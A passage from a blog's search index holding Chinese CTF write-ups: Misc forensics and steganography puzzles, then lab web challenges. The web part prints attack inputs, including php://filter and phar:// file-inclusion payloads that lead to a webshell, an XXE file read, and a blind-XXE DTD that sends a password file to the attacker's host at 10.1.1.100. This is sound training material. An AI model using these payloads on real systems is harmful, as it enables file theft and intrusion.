0x1fcf9e8e:\rprint (hex(i)[2:])\r更改高度为333 又找了半天，结果发现提示说，flag包含nep，结果没想到flag是flag{你发现了nep}，行吧，俺想复杂了。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:10:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x0B lsb（123456）.png 上神器。 发现文件头不对劲，找了下，发现题目可能类似这道题。https://blog.csdn.net/fuzz_nancheng/article/details/53384353，下载cloacked-pixel（Win10系统下无法使用，建议在kail使用） 得到flag{6e9fbfe27c40bbad06db30c42c04c4d6} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:11:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x0C bin.txt 打开是一大片01的二进制字符，通过CyberChef转换。 得到一张图片。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:12:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x0D 我是间谍 这题是间谍软件分析，运行后使用wireshark抓包，发现一条异常udp流。 打开后，显示flag{11973526}。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:13:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x0E Stegsolve工具使用 上神器，发现二维码。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:14:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x0F 监听消息 追踪Tcp流发现 另存16进制字符，发现是png。 得到半截二维码，改高度。 得到完整的块儿后，贴个定位符。也可在https://merricx.github.io/qrazybox/填充。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:15:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x10 简单流量 hint：关于ssl密钥导入：https://segmentfault.com/a/1190000018746027 按照提示配置环境变量和WireShark，因为pcapng文件名zstuctf，猜测此题flag也是zstuctf，过滤字符串，追踪tls流。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:16:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x11 图片Base64编码 还原得到一张二维码，扫码得到flag。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:17:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x12 Base编码 LJWXQ2C2GN2EGTSIJZWFQ6SGPJMHUTTIMMZWW2DGKE6T2===经过Base32解码得到ZmxhZ3tCNHNlXzFzXzNhc3khfQ==，再经过Base64解码得到flag{B4se_1s_3asy!} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:18:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x13 zip伪加密 改9为0，得到flag{zip_is_funny!}。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:19:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x14 常见文件文件头补齐 PNG文件头89 50 4E 47 0D 0A 1A 0A，可以观察到，缺少了4个字节，补全。 成功得到。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:20:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x15 Morse编码 ..-. .-.. .- --. ----.-- .. .-.. --- ...- . -.-- --- ..- -----.-转换得到FLAG%u7bILOVEYOU%u7d，%u7b就是{，%u7d就是}。flag{ILOVEYOU} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:21:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x16 16进制查看 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:22:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x17 二维码条形码 拼接扫码，得到flag{winter_is_coming} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:23:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x18 LSB图片隐写 可以看出藏了个压缩包，另存一下。 直接解压时失败，文件损坏，winrar修复后解压文件，搜索ctf字符。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:24:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x19 电子文档隐写 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:25:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x1A HTML实体编码 \\u66\\u6c\\u61\\u67\\u7b\\u57\\u33\\u6c\\u63\\u30\\u6d\\u65\\u21\\u7d通过ASCII转成flag{W3lc0me!} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:26:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x1B 键盘密码 ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm对照键盘连线areuhack ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:27:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x1C Foremost \u0026\u0026 binwalk使用 使用binwalk和foremost 解压压缩包，得到flag{ff17_is_funny!} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:28:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x1D LSB音频隐写 slienteye解码 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:29:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x1E pyc反编译 在线反编译pyc，得到python代码。 print 'Your input1 is your flag~'\rl = len(input1)\rcode = []\rfor i in range(l):\rnum = ((ord(input1[i]) + i) % 128 + 128) % 128\rcode += chr(num)\rfor i in range(l - 1):\rcode[i] = chr(ord(code[i]) ^ ord(code[i + 1]))\rprint code\rcode = ['\\x0b', '\\x0e', '\\t', '\\x15', '0', '4', '\\x01', '\\x06', '\\x14', '4', ',', '\\x1b', 'U', '?', 'o', '6', '*', ':', '\\x01', 'D', ';', '%', '\\x13']\r编写解码代码 code = ['\\x0b', '\\x0e', '\\t', '\\x15', '0', '4', '\\x01', '\\x06', '\\x14', '4', ',', '\\x1b', 'U', '?', 'o', '6', '*', ':', '\\x01', 'D', ';', '%', '\\x13']\rl=len(code)\rfor i in range(l-2,-1,-1):\rcode[i]=chr(ord(code[i])^ord(code[i+1]))\rfor i in range(l):\rprint(chr((ord(code[i])-i)%128),end='')\r运行得到结果：flag{Just_Re_1s_Ha66y!} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:30:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x1F zip口令爆破 拿到flag{zip_is_so_easy!} ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:31:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x20 明文攻击 构造一个crc32值与压缩后文件大小一致的readme.txt，这里用一位师傅写的脚本，非常好用。 from zlib import crc32\rimport random\rchar='0123456789'\rdef crc32_f(data):\rreturn hex(crc32(data)\u00260xffffffff)[2:10]\rlength=input('length:')\rcrc32_=raw_input('crc32:').lower()\rwhile True:\rtext=''\rfor i in range(length):\rtext+=char[random.randint(0,len(char)-1)]\rif crc32_f(text)==crc32_:\rraw_input('find it:'+text)\rexit\r","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:32:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x21 音频频谱隐写 用Audacity打开，显示频谱图。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:33:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x22 MP3 隐写 爷青回，金刚葫芦娃可还行，文件是MP3，首先想到利用MP3Stege，但没有密码010打开后发现藏有东西，分离出jpg和zip。 压缩包是加密的，根据图片的提示，猜测密码是GourdSmallDiamond，解密MP3。 成功解开，打开1.mp3.txt，得到解压密码j7v@8@8QUWG0FWU^ 得到MSTSEC{MSTSEC_DINGANN_KEY_IS_GSD}，但通不过，改成flag即可。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:34:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x23 音频波形隐写 用Audacity打开，显示波形图，发现异常，设高点为1，低点为0编码 得：110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101共105位，不能整除8，但能整除7，则以7个为一组分开，并且在最高位补0 得：01100110 01101100 01100001 01100111 01111011 01010111 00110000 01010111 00101010 01100110 01110101 01101110 01101110 01111001 01111101，转ASCII码得到flag。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:35:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x24 流量分析(一) 直接搜索flag，结果出来一堆假flag，发现使用ftp协议传了两张图片，存一下。 发现第一张图片有缺陷，是第二张的部分，这里直接分析第二张。 多次尝试后发现是LSB隐写。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:36:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x25 GIF图片隐写 补上文件头。 Stegslove打开逐帧查看,发现字符叠加，肉眼难以辨别，有师傅提到用工具Namo_GIF选择每一帧，然后编辑调色板，将第254帧改为同一个颜色，即可看清每一帧的内容，拼接得到Y2F0Y2hfdGhlX2R5bmFtaWNfZmxhZ19pc19xdW10ZV9zaW1wbGU=。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:37:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x26 数字水印隐写 猜测是盲水印，需要找到另一张图片，pngcheck发现IEND后还有数据。 发现又有IHDRchunck块，导出，补全文件头，得到一张和原图一模一样的图。 运行python bwm.py decode half.png half1.png wm.png，得到： 只有一半，找前半段。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:38:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x27 python脚本使用(一) 用pngcheck发现高度有问题。 上python脚本爆破高度，得到232，再用pngcheck，发现异常数据。 找到数据，并进行zlib解压。\r78 9C 5D 91 01 12 80 40 08 02 BF 04 FF FF 5C 75 29 4B 55 37 73 8A 21 A2 7D 1E 49 CF D1 7D B3 93 7A 92 E7 E6 03 88 0A 6D 48 51 00 90 1F B0 41 01 53 35 0D E8 31 12 EA 2D 51 C5 4C E2 E5 85 B1 5A 2F C7 8E 88 72 F5 1C 6F C1 88 18 82 F9 3D 37 2D EF 78 E6 65 B0 C3 6C 52 96 22 A0 A4 55 88 13 88 33 A1 70 A2 07 1D DC D1 82 19 DB 8C 0D 46 5D 8B 69 89 71 96 45 ED 9C 11 C3 6A E3 AB DA EF CF C0 AC F0 23 E7 7C 17 C7 89 76 67 D9 CF A5 A8 00 00 00 00 得到一串二进制代码，长度为625，想到画25X25的二维码，扫码得到flag。 from PIL import Image from zlib import * MAX = 25 pic = Image.new(\"RGB\",(MAX,MAX)) str =\"1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011\" i=0 for y in range(0,MAX): for x in range(0,MAX): if(str[i] == '1'): pic.putpixel([x,y],(0,0,0)) else:pic.putpixel([x,y],(255,255,255)) i = i+1 pic.save(\"flag.png\") ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:39:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"0x28 内存取证 使用volatility，进行镜像分析，知道了系统。详细用法参考：https://www.cnblogs.com/jssi/p/13762308.html 查看进程，发现可疑进程TrueCrypt.exe dump出来，volatility -f mem.vmem --profile=WinXPSP2x86 memdump -p 2012 -D ./2012为nc的进程号，./为保存的路径，用010打开文件，搜索ctf{。 ","date":"2021-02-08","objectID":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/:40:0","tags":["Misc","CTF"],"title":"NepNep Winter-CAMP（Misc合集）","uri":"/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/"},{"categories":["WriteUp"],"content":"\r","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:0:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x00 前言 继续van。 ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:1:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x01 第九周 | 试下phpinfo吧 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5009 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 根据题目，需要用到phpinfo页面。猜测需要利用文件包含漏洞。 把cn.php替换成phpinfo.php后失效，判断文件不在此目录，跳到父目录。打开了phpinfo。 网页底部藏着flag{abcd_hetianlab_1234_qwer} ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:2:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x02 第十周 | 试试协议吧 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5010 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 一进去就蹦出来个链接，点进去。 改下flie。 题目说要运用协议，那就尝试一番。php://filter/convert.base64-encode/resource=flag.php，就出来了一串base64编码。 ZmxhZyBpbiBoZXJlDQo8P3BocCAvL2ZsYWd7YWJkY18xMjM0X3F3ZXJfaGV0aWFufT8+\r成功拿到flag{abdc_1234_qwer_hetian} ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:3:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x03 第十一周 | 签到般的包含 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5011 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{}，菜刀目录：C:\\tools\\ 传图片，直接失败。 测试发现jpg类型可以上传。 进入文件夹看一看。 题目说有个include.php文件，应该是个文件包含漏洞 ，输入url路径。 看了一位师傅的WP，要用phar伪协议，这个协议可以访问zip格式压缩包内容，我们先构造一个压缩包写一个php一句话到1.php，再把1.php压缩成1.zip，为了成为白名单，把1.zip后缀改为jpg，成功上传。 在菜刀输入http://10.1.1.147:5011/include.php?file=phar://a.jpg/a，连上WebShell。 得到flag{whoami_hetianlab_student}。 Ps：没有第十二周的实验，但可以根据题目iP猜测10.1.1.147:5012，进去提示加file参数\r没啥思路，搜了下，发现有师傅做过视频，视频开头给出了相关的题目信息，菜刀、日志路径、ubuntu系统和LFI（Local File Include），现有环境下按照师傅的方法无法复现，这题主要是通过/var/log/apache2/access.log进行命令执行，讲得挺好的。\r","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:4:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x04 第十三周 | simple xxe 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5013 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 查看源码，发现信息。 随便输入后抓个包，发现用户名和密码是通过XML标签传值的，题目也明说了，要用XXE（XML External Entity）。 借助file协议实现外部实体声明来读取文件，代码如下： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\r\u003c!DOCTYPE root [\r\u003c!ENTITY xxe SYSTEM \"file:///opt/flag.txt\"\u003e\r]\u003e\r\u003cuser\u003e\u003cusername\u003e\u0026xxe;\u003c/username\u003e\u003cpassword\u003e1\u003c/password\u003e\u003c/user\u003e\r成功拿到。 ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:5:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x05 第十四周 | blind xxe 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5014 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 题目考察Blind XXE，查看源码发现目标文件。 ifconfig查看本机ip为10.1.1.100，这里发现Apache服务没有开启，使用service apache2 start。 采用如下的payload post:\r\u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM \"http://10.1.1.100/1.dtd\"\u003e\r%remote;%int;%send;\r]\u003e\r1.dtd的内容\r\u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///tmp/password.txt\"\u003e\r\u003c!ENTITY % int \"\u003c!ENTITY % send SYSTEM 'http://10.1.1.100:9999?p=%file;'\u003e\"\u003e\rpython -m SimpleHTTPServer 9999\r得到一串base64编码ZmxhZ3toZXRpYW5fMTIzNF9hd2RyfQo=，解码得到flag{hetian_1234_awdr} ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:6:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x06 第十五周 | 回显的SSRF 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5015 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 给出了flag在/opt/flag.txt，题目明示了是有回显的SSRF，用file协议直接读取。 ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:7:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x07 第十六周 | 有点另类的SSRF 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5016 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 按照上一个实验的步骤用file协议直接读取，提示要以管理员身份登录。 使用BurpPOST一个admin的值，得到下一条提示信息。 使用X-Forwarded-For、X-Real-Ip、X-Client-Ip、Client-Ip等来伪造ip。 打开source.txt，查看源码，能看到flag的文件位置。 \u003c?php // /opt/flag.txt\rfunction getUrlContent($url){\r// $url = safe($url);\r$url = escapeshellarg($url);\r$pl = \"curl \".$url;\r// echo $pl;\r$content = shell_exec($pl);\rreturn $content;\r}\recho \"you need to login as admin!\";\recho \"\u003c!-- post param 'admin' --\u003e\";\rif(isset($_POST['admin']))\r{\rif($_POST['admin']==1)\r{\rif($_SERVER['HTTP_X_CLIENT_IP'])\r{\recho \"fileread source.txt\";\rif (isset($_POST['handler'])\u0026\u0026!empty($_POST['handler']))\r{\r$url = $_POST['handler'];\r$content_url = getUrlContent($url);\recho $content_url;\r}\r}\relse\r{\recho \"only 127.0.0.1 can get the flag!!\";\r}\r}else\r{\r$_POST['admin']=0;\r}\r}\r","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:8:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x08 第十七周 | 给你扔了串代码 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5017 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 首页给出了源代码的图片。 这是一道变量覆盖的题目，重点关注这两段代码。 foreach ($_GET as $key =\u003e$value){\r$$key=$$value;\r}foreach ($_POST as $key =\u003e$value){\r$$key=$value;\r}\r这道题说f12可以使用hackbar，但实际上用不了，换个环境，继续做。Get传值时将$_200的值设为$flag的值，POST传值flag=随便的数，就能绕过，然后输出$_200里的值。 ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:9:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x09 第十八周 | 学会变量覆盖 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5018 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 查看源代码信息。 试一下url后加上/?gift=，直接得到flag{hetianlab}，猜测变量content的值为空，变量flag需要传上去。 ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:10:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x0A 第十九周 | Easy PHP 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5019 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 分析源码 重点关注Get传值方法，设一个中间变量来传递flag的值。 ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:11:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x0B 第二十周 | 最后一道变量覆盖 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5020 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 分析源码 这个需要利用PHP的弱类型来进行md5碰撞和parse_str的变量覆盖。 ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:12:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x0C 第二十一周 | 你的空格哪去了 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5021 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 简单的SQL注入，需要绕过空格的过滤。 经过测试在order by 3时能够正常回显，order by 